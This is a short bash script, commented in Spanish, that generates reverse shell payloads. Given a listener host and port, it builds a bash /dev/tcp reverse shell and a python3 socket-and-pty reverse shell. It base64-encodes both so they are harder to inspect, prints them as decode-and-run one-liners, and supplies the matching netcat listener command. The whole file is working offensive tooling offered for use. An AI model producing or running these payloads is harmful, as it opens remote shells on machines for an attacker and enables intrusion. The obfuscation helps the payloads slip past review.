#!/usr/bin/env bash
# RevShell Gen (B) – Obfuscación base64 + helper para listener
# Uso: ./revshell_b.sh 10.10.14.7 4444

set -euo pipefail
LHOST="${1:-}"; LPORT="${2:-}"
[[ -z "$LHOST" || -z "$LPORT" ]] && { echo "Uso: $0 <LHOST> <LPORT>"; exit 1; }

mkpayload() { printf "%s" "$1" | base64 -w0; }

BASH_PAY="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
PY_PAY="python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"

echo "# Listener:"
echo "nc -lvnp $LPORT"
echo
echo "# bash (b64):"
echo "echo $(mkpayload "$BASH_PAY") | base64 -d | bash"
echo
echo "# python3 (b64):"
echo "echo $(mkpayload "$PY_PAY") | base64 -d | bash"
